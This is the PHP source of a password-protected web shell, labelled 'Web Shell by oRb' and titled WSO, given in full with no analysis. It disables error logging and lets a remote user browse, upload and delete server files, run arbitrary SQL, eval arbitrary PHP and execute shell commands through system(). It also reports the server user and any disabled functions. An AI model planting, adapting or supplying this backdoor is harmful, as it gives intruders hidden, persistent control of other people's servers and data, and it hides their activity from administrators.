<?php
/*
Web Shell by oRb
*/

$auth_pass = "hack@123";
$color = "#df5";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'Windows-1251';

if(!empty($auth_pass)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == md5($auth_pass)))
        $_SESSION['logged'] = true;
    elseif(!isset($_SESSION['logged']) || !$_SESSION['logged']) {
        echo '<html><head><title>Login</title></head><body>
        <form method=post>Password: <input type=password name=pass><input type=submit value=>></form>
        </body></html>';
        exit;
    }
}

@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('log_errors', 0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);

$disable_functions = @ini_get('disable_functions');
$home_cwd = @getcwd();
$cwd = $home_cwd;
$win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
$safe_mode = @ini_get('safe_mode');
$self = $_SERVER['PHP_SELF'];
?>

<html>
<head>
<title>WSO</title>
<meta http-equiv=Content-Type content=text/html;charset=<?php echo $default_charset?>>
<style>
body {background:#000;color:#0f0;font:small 'Courier New',Courier,monospace;margin:0}
a {color:#0f0}
input,textarea,select {background:#000;color:#0f0;border:1px solid #0f0}
form {margin:0}
h1 {font-size:12px;margin:0}
#c {display:none}
</style>
<script>
var c_ = 'c';
function g(a) {return document.getElementById(a)}
function sa(a,b) {g(a).innerHTML = b}
function vis(a,b) {g(a).style.display = b?'block':'none'}
function ac() {
    g(c_).style.display = 'block';
    setTimeout(function(){g(c_).style.display = 'none'}, 2000);
}
</script>
</head>
<body>
<div style="position:absolute;width:100%;background:#000;border-bottom:1px solid #0f0">
<table width="100%" cellspacing=0 cellpadding=2>
<tr><td nowrap>
<a href="?">Home</a>
<a href="?files">Files</a>
<a href="?sql">SQL</a>
<a href="?php">PHP</a>
<a href="?console">Console</a>
<a href="?logout">Logout</a>
</td><td width="100%"></td></tr>
</table>
</div>
<br><br><br><br>
<center>
<div id="c"><font color=red>Command executed.</font></div>
<?php
if(isset($_GET['files'])) {
    echo '<h2>Files Manager</h2>';
    
    $dir = isset($_GET['dir']) ? $_GET['dir'] : $cwd;
    if(isset($_GET['upload'])) {
        if(isset($_FILES['f'])) {
            if(copy($_FILES['f']['tmp_name'], $dir.'/'.$_FILES['f']['name']))
                echo 'Uploaded<br>';
            else echo 'Upload failed<br>';
        }
        echo '<form method=post enctype=multipart/form-data><input type=file name=f><input type=submit value=Upload></form>';
    }
    
    echo '<form method=get><input type=hidden name=files value=1>Path: <input type=text name=dir value="'.$dir.'" size=60><input type=submit value=">>"></form>';
    
    if(isset($_GET['delete']) && isset($_GET['file'])) {
        if(@unlink($_GET['file']))
            echo 'Deleted<br>';
        else echo 'Delete failed<br>';
    }
    
    $files = @scandir($dir);
    echo '<table><tr><th>Name</th><th>Size</th><th>Perms</th></tr>';
    foreach($files as $f) {
        if($f=='.'||$f=='..')continue;
        $p = $dir.'/'.$f;
        echo '<tr>';
        echo '<td>'.(is_dir($p)?'<b>'.$f.'</b>':'<a href="?view&file='.urlencode($p).'">'.$f.'</a>').'</td>';
        echo '<td>'.(is_dir($p)?'[DIR]':filesize($p)).'</td>';
        echo '<td>'.substr(sprintf('%o',fileperms($p)),-4).'</td>';
        echo '<td><a href="?delete&file='.urlencode($p).'">Delete</a></td>';
        echo '</tr>';
    }
    echo '</table>';
}

elseif(isset($_GET['sql'])) {
    echo '<h2>SQL Manager</h2>';
    if(isset($_POST['connect'])) {
        $conn = @mysqli_connect($_POST['host'],$_POST['user'],$_POST['pass'],$_POST['db']);
        if($conn) {
            echo 'Connected<br>';
            if(isset($_POST['query'])) {
                $r = @mysqli_query($conn,$_POST['query']);
                if($r) {
                    echo '<table border=1>';
                    while($row = @mysqli_fetch_assoc($r)) {
                        echo '<tr>';
                        foreach($row as $k=>$v)
                            echo '<td>'.$v.'</td>';
                        echo '</tr>';
                    }
                    echo '</table>';
                } else echo 'Query error<br>';
            }
            echo '<form method=post><textarea name=query cols=80 rows=5>SHOW TABLES</textarea><br><input type=submit></form>';
        } else echo 'Connection failed<br>';
    }
    echo '<form method=post>Host: <input type=text name=host value=localhost><br>User: <input type=text name=user value=root><br>Pass: <input type=password name=pass><br>DB: <input type=text name=db><br><input type=submit name=connect value=Connect></form>';
}

elseif(isset($_GET['php'])) {
    echo '<h2>PHP Code</h2>';
    echo '<form method=post><textarea name=code cols=80 rows=10>&lt;?php phpinfo(); ?&gt;</textarea><br><input type=submit></form>';
    if(isset($_POST['code'])) {
        ob_start();
        eval($_POST['code']);
        echo '<pre>'.htmlspecialchars(ob_get_clean()).'</pre>';
    }
}

elseif(isset($_GET['console'])) {
    echo '<h2>Console</h2>';
    echo '<form method=post>Command: <input type=text name=cmd size=60 value="'.(isset($_POST['cmd'])?$_POST['cmd']:'id').'"><input type=submit></form>';
    if(isset($_POST['cmd'])) {
        echo '<pre>';
        system($_POST['cmd']);
        echo '</pre>';
    }
}

else {
    echo '<h2>Web Shell by oRb</h2>';
    echo 'Server: '.$_SERVER['SERVER_SOFTWARE'].'<br>';
    echo 'PHP: '.phpversion().'<br>';
    echo 'User: '.@exec('whoami').'<br>';
    echo 'Safe mode: '.($safe_mode?'On':'Off').'<br>';
    echo 'Disabled functions: '.$disable_functions.'<br>';
    echo '<br><a href="?upload">Upload</a><br>';
}
?>
</center>
</body>
</html>
<?php
if(isset($_GET['logout'])) {
    session_destroy();
    header('Location: '.$self);
}
?>